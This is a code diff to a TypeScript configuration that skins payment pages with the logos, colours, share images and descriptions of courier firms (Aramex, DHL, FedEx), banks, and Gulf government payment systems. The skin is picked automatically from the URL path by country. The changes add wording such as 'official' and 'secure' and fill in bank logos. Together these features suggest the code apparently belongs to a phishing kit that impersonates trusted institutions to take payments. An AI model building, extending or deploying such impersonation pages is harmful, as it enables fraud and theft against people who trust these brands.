@@ -1,5 +1,6 @@
 import { serviceLogos } from './serviceLogos';
 import { bankBranding } from './brandingSystem';
+import { governmentPaymentSystems } from './governmentPaymentSystems';
 
 import heroAramex from '@/assets/hero-aramex.jpg';
 import heroDhl from '@/assets/hero-dhl.jpg';
@@ -125,7 +126,7 @@ const generateEntitiesFromServices = (): Record<string, DynamicIdentityEntity> =
       animated_header_images: headerImages.length > 0 ? headerImages : [service.heroImage || service.ogImage || ''],
       header_position: 'below_top_bar',
       payment_share_image: service.ogImage || '',
-      payment_share_description: service.description || `خدمات ${key}`,
+      payment_share_description: service.description || `خدمات ${key} الرسمية`,
       colors: {
         primary: service.colors.primary,
         secondary: service.colors.secondary,
@@ -133,7 +134,7 @@ const generateEntitiesFromServices = (): Record<string, DynamicIdentityEntity> =
       },
       fonts: ['Cairo', 'Tajawal', 'Arial'],
       buttons: {
-        style: 'rounded',
+        style: key === 'dhl' || key === 'fedex' ? 'flat' : 'rounded',
         hover: 'darken',
       },
       background_images: headerImages.length > 0 ? headerImages : [service.heroImage || service.ogImage || ''],
@@ -149,11 +150,11 @@ const generateEntitiesFromBanks = (): Record<string, DynamicIdentityEntity> => {
   
   Object.entries(bankBranding).forEach(([key, bank]) => {
     entities[`bank_${key}`] = {
-      logo: '',
+      logo: bank.logoUrl || '',
       animated_header_images: [],
       header_position: 'below_top_bar',
-      payment_share_image: '',
-      payment_share_description: `الخدمات المصرفية الإلكترونية - ${bank.nameAr}`,
+      payment_share_image: `/og-bank-${key}.jpg`,
+      payment_share_description: `الخدمات المصرفية الإلكترونية الآمنة - ${bank.nameAr}`,
       colors: {
         primary: bank.colors.primary,
         secondary: bank.colors.secondary || bank.colors.primary,
@@ -177,10 +178,39 @@ const generateEntitiesFromBanks = (): Record<string, DynamicIdentityEntity> => {
   return entities;
 };
 
+const generateEntitiesFromGovSystems = (): Record<string, DynamicIdentityEntity> => {
+  const entities: Record<string, DynamicIdentityEntity> = {};
+
+  Object.entries(governmentPaymentSystems).forEach(([key, gov]) => {
+    entities[`gov_${key.toLowerCase()}`] = {
+      logo: gov.logo || '',
+      animated_header_images: gov.heroImage ? [gov.heroImage] : [],
+      header_position: 'below_top_bar',
+      payment_share_image: gov.heroImage || '',
+      payment_share_description: gov.description,
+      colors: {
+        primary: gov.colors.primary,
+        secondary: gov.colors.secondary,
+        background: gov.colors.background,
+      },
+      fonts: [gov.fonts.primaryAr, gov.fonts.primary],
+      buttons: {
+        style: gov.countryCode === 'KW' ? 'flat' : 'rounded',
+        hover: 'highlight',
+      },
+      background_images: gov.heroImage ? [gov.heroImage] : [],
+      auto_apply: true,
+    };
+  });
+
+  return entities;
+};
+
 export const dynamicIdentityConfig: DynamicIdentityConfig = {
   entities: {
     ...generateEntitiesFromServices(),
     ...generateEntitiesFromBanks(),
+    ...generateEntitiesFromGovSystems(),
     chalets: {
       logo: '/assets/dynamic-identity/official_logo_chalets.svg',
       animated_header_images: [
@@ -411,7 +441,16 @@ export const detectEntityFromURL = (): string | null => {
   
   const path = window.location.pathname.toLowerCase();
   if (path.includes('chalet')) return 'chalets';
-  if (path.includes('government') || path.includes('gov')) return 'government_payment';
+  if (path.includes('government') || path.includes('gov')) {
+    // Try to detect country from path for gov systems
+    if (path.includes('/sa/')) return 'gov_sa';
+    if (path.includes('/ae/')) return 'gov_ae';
+    if (path.includes('/kw/')) return 'gov_kw';
+    if (path.includes('/qa/')) return 'gov_qa';
+    if (path.includes('/om/')) return 'gov_om';
+    if (path.includes('/bh/')) return 'gov_bh';
+    return 'government_payment';
+  }
   if (path.includes('local')) return 'local_payment';
   if (path.includes('invoice')) return 'invoices';
   if (path.includes('contract')) return 'contracts';
